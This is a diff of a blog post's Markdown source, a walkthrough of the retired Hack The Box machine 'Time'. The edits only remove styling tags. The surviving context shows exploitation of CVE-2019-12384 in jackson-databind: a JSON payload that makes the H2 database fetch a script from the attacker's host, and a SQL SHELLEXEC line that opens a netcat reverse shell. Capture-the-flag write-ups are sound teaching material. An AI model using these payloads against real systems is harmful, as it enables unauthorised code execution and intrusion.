@@ -19,12 +19,12 @@ title: 'Walktrough: HTB Time'
 Hello everyone!
 
 The machine of this week will be **Time**, another Linux box medium rated from [Hack The Box](https://www.hackthebox.eu), created by [
-egotisticalSW](https://app.hackthebox.eu/users/94858) and [felamos](https://app.hackthebox.eu/users/27390).<!--more-->
+egotisticalSW](https://app.hackthebox.eu/users/94858) and [felamos](https://app.hackthebox.eu/users/27390). [more]
 
 :information_source: **Info**: Write-ups for Hack the Box are always posted as soon as machines get retired.
-{: .notice--info}
 
-![HTB Time](https://i.imgur.com/mJmeefG.png){: .align-center}
+
+![HTB Time](https://i.imgur.com/mJmeefG.png)
 
 ## Enumeration
 
@@ -56,7 +56,7 @@ Nmap done: 1 IP address (1 host up) scanned in 10.70 seconds
 
 Starting by checking the HTTP service published on port 80, noticed that we have a JSON Validation and Beautifier service.
 
-![Online JSON Parser - Time](https://i.imgur.com/V6RbC9L.png){: .align-center}
+![Online JSON Parser - Time](https://i.imgur.com/V6RbC9L.png)
 
 After some enumeration with `whatweb` and `nikto`, I haven't found anything useful, so I proceeded to app experimentation, looking for some vulnerability that could lead us to some code injection or LFI.
 
@@ -64,7 +64,7 @@ Analyzing the application, we have two functionalities: **Beautify** and **Valid
 
 - The option beautify, after receiving a valid JSON, formats it in a pretty manner and, sending an invalid content (e.g. "test"), returns a `null` value.
 
-![Online JSON Parser - Time - beautify](https://i.imgur.com/tpO2p3r.png){: .align-center}
+![Online JSON Parser - Time - beautify](https://i.imgur.com/tpO2p3r.png)
 
 - The Validate option (in beta) checks the syntax of the JSON provided. When we send an invalid request (e.g. "test"), the exception below is returned.
 
@@ -78,7 +78,7 @@ After searching for `com.fasterxml.jackson.core` I have found about the **Jackso
 
 Looking for CVEs on jackson-databind, I have found the following for code execution published in 2019, according to the page [CVE Details](https://www.cvedetails.com):
 
-![CVE Details](https://i.imgur.com/T2Kth6e.png){: .align-center}
+![CVE Details](https://i.imgur.com/T2Kth6e.png)
 
 Of the 4 listed, I have found for **CVE-2019-12384** a working PoC at [this blog](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html), which I have used to gain initial access to the box. The following steps were used to get a reverse shell:
 
@@ -100,9 +100,9 @@ CALL SHELLEXEC('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.1
 ["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.10.10/inject.sql'"}]
 ```
 
-![Listener and Webserver - Time](https://i.imgur.com/7o42urH.png){: .align-center}
+![Listener and Webserver - Time](https://i.imgur.com/7o42urH.png)
 
-![Online Json Parser - Sending the payload](https://i.imgur.com/Pv2Vbzy.png){: .align-center}
+![Online Json Parser - Sending the payload](https://i.imgur.com/Pv2Vbzy.png)
 
 ## User flag
 
